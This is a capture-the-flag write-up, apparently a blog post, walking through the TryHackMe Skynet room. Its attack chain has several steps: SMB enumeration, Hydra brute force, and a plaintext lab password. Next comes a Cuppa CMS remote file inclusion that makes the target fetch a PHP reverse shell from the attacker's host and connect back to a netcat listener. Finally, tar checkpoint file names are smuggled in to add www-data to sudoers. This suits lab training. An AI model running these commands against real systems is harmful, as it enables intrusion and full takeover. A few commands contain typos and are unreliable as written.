# Skynet: The Ultimate Terminator CTF Guide 🤖

Terminator? I don't even know her! (Enter 90's laugh track here). No but seriously, the [Skynet Try Hack Me CTF](https://tryhackme.com/room/skynet) was so much fun and it was challenging, and so I had to write a write-up on it! When you're ready, put up your imaginary Terminator posters, and let's "get back" to it! 😆

![Skynet CTF](https://media.giphy.com/media/C3DJ5zE2l2VUc/giphy.gif)

Just a quick note before we start. If you run the IP address of your given machine in the browser, you are met with a "search engine" that does not work. I just wanted to get it out of the way before we start, because this page is useless and I don't want to leave you wondering.
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l9akjb0rjtco6hjlt01g.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n55688hushs7f69tqxq7.png)

---

## What is Miles password for his emails?
Before we get _crackalacking_ at miles' emails, we need to do some basic enumeration. Let's start with an nmap scan to see what services are running on our open ports. Let's take note of our Samba smbd workgroup that is running, as this means we can exploit it via [smbclient](https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/)!

`nmap -sV -Pn <your machine IP>`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nse2gm6gg2fc59rgrdz7.png)

Let's go ahead and scan for workgroup shares using smbclient. 
`smbclient -L \\\\<your machine IP>` 
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gftn3euw0ktccfzh6x9w.png)

We can identify two important shares: milesdyson and anonymous. When we try to log in with milesdyson without a password/username we get an access denies status, yet, we can log in to anonymous this way.
`smbclient //10.10.58.198/anonymous -U " "%" "`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wkyjagc3bzum3r0o56wo.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/m7zy8j9cmpc73632no0b.png)

When we read the `attention.txt` file from anonymous's share we can see that all users had to change their passwords. When we read the `logs` we can see that it contains all the changed passwords! (Only log1.txt contains any data. Log2 and 3 have no data).
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4laul80a0d3c1149m4h7.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/adh3w49ku0kkusn31i2p.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kg0084x49lmhiqwn3ptf.png)

Copy the data from logs1.txt into a .txt file on your Desktop, or download it from smb and copy it. Then create a file named `users.txt` in the same directory as your `log1.txt` and insert one value into it: "Miles".
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4gwygy29yh9h9s38pc7c.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lccn2n4yemxxea8u3gh5.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/c1anli6f6rlmntsqp5uq.png)
   
Now we can use Hydra to brute force Miles's password.
`
export ip=<your machine IP>
hydra -L users.txt -P log1.txt &ip smb -V -f
` 
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0jsavb7pt7jdb7zert67.png)

Tada! We have our password!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fgdjxluisgoy5i0l2tkg.png)
 
---

## What is the hidden directory?
Okay, before we continue, let's run a gobuster scan to see which directories we can navigate to.
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small-txt -u <your machine IP> -t 50`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l2csly06aftrbhsg9y9k.png)

From there on, we can navigate to /administrator in our browser. We are met with a SquirrelMain Login page. 
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cntenend21ublqs3jvp8.png)

Let's see if we can log in with the credentials username: `milesdyson`, password: `cyborg007haloterminator`. Success!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q1634i3d740jkfi2ra03.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ix8nuer1ym8218un6ddw.png)

If we read the seranakogan@skynet emails, we realize it's useless binary code. The important email is from skynet@skynet as it contains Miles' smbclient password!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/u9b54waufyvw8niswfs0.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/odz5q4cpeahr1b1fqyt6.png)

Let's head back to our terminal and try to log in this time with milesdyson's username and the password from the email above.
`smbclient //<your machine IP>/milesdyson -U "milesdyson`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bvfbh8xq84q93xfpuja0.png)

We now have access to his smb! We are hacker masters. Let's see what is in his `/notes` directory.
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xupclxtrcfgm20x94kfp.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3ulv6g3i7azonhv1tm7c.png)

When we read the contents of the `/important.txt` file, we get our hidden directory!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mo8j869ugthwmz2c95xw.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qdqq02way5mg86up4jzg.png)

---

## What is the vulnerability called when you can include a remote file for malicious purposes?
[Remote file inclusion (RFI)](https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrator’s goal is to exploit the referencing function in an application to upload malware (e.g., backdoor shells) from a remote URL located within a different domain.  
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y84n8x8oc0pqx16urks6.png)

---

## What is the user flag? 
Okay, now the hard work starts. First things first, let's see what is in our `/45kra24zxs28v3yd` hidden directory.
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y9vhgbtefbrccxlknv55.png)

It's just a personal page. Maybe gobuster can tell us more.
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small-txt -u http://<your machine IP>/45kra24zxs28v3yd -t 50` 
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x18hz4q48v3mxpdfqhyl.png)

Let's now go to our `/45kra24zxs28v3yd/administrator` directory. We are met with a Cuppa CMS page (which cannot be cracked with sqli attacks such as 'admin OR 1=1--;!)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hr01m24xnlrvly1pfgoo.png)

With some digging, we can see that the Cuppa CMS system is subject to remote file inclusion attacks, which means that we can upload a reverse shell to gain access to user data!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b4bq3twf5ynwitbzn1kz.png) 
 
Okay, let's get our reverse shell going. To make it easy for you, you can just open up your terminal and run the following command to pull one from [Pentestmonkey's GitHub](https://github.com/pentestmonkey/php-reverse-shell).
`wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ksztc85jb0enhk461ctx.png)

With our reverse-shell downloaded, we need to change two values: our IP address and our port. I keep my port at the default 1234, because I don't care. Change the IP address in your php-reverse-shell.php script to the IP address of your OPENVPN/attacker machine IP, not your lab's target machine. I did this via [vim](https://www.designbombs.com/mastering-vim-commands-the-ultimate-list/), but you can do it manually by naviagting to it if you want.
`vim php-reverse-shell.php`

![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p3qws6wevqnjf1nvmhey.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qo76pl4fc1t1yfw3eguq.png)

Next up, start up a netcat listener on the port defined above (in my case, 1234).
`sudo nc -nlvp 1234`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/j9zzhqh1wlwbftosu0eh.png)

Then, start up a python server which will serve our reverse shell.
`sudo python3 -m http.server`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bwhb90l4tl9ftkk8ml5r.png)

Now, go back to your browser and enter the following URL (replacing the IP's with your values).
`http://<machine IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OPENVPN IP>:8000/php-reverse-shell.php`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pgt5hng5ut9rb0p0mx5k.png)
 
Notice the changes on your `python server`:
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/j8xwbkolocq3m68ibttr.png)
And your `netcat listener`:
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tlryjyotoz2drgtyyezp.png)

Our reverse shell worked! We now have access! Now we can just navigate to `user.txt` and read our user flag!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ctg11pp6mu4vifej5bvo.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/izwkb1qdv95mkc8idkjf.png)

---

## What is the root flag?   
We still only have www-data access. We need to find a way to get root access. Let's navigate to `/home/milesdyson/backups` and see what we can find.
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uwuagjmguue426hy6vvq.png)

This backup file gets a shell, navigates to the /var/www/html directory and creates a backup of everything in the directory. Read more on how we can exploit this on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), but for now, I'm just going to show you.

*Side note: We can also find the same information as above by running the `cat /etc/crontab` command. 
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/529xn9ksiumep65693p4.png)

To exploit our tar, do the following:
`cd /var/www/html`
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jgdxr8dnl4756d6aobbx.png)

1. `echo 'echo "www-data ALL=(root) NOPASSWD; ALL" >> etc/sudoers' > sudo.sh`
2. `touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh`
3. `touch "/var/www/html/--checkpoint=1`
4. `sudo su`

![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v2acfk1lnuf3a4hfry65.png)

We now have root access. We can simply now cd into `/root` and get our flag!
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qk2ult9o4wye15j9i0pj.png)
![Skynet CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7bp4txycym95awozfgkb.png)

---

## Conclusion
Congratulations! You have successfully completed the Skynet CTF. I hope this was easy enough to follow, and that you had fun along the way. Until next time, happy hacking! 😊



  


  
 
 
 
 
 
 
 


  
 



 


